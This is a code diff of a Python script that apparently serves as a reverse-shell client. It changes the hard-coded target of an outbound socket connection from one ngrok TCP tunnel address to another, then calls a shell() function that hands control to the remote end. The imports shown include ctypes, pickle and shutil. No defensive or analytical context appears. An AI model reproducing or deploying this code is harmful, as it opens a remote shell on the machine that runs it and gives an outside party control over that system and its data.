@@ -1,7 +1,7 @@
-import base64
+# import base64
 import ctypes
-import json
-import multiprocessing
+# import json
+# import multiprocessing
 import os
 import pickle
 import shutil
@@ -352,7 +352,7 @@ def shell():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connection()
-sock.connect(("6.tcp.ngrok.io", 14806))  # ngrok tcp 9001
+sock.connect(("8.tcp.ngrok.io", 17655))  # ngrok tcp 9001
 print("connected")
 shell()
 sock.close()
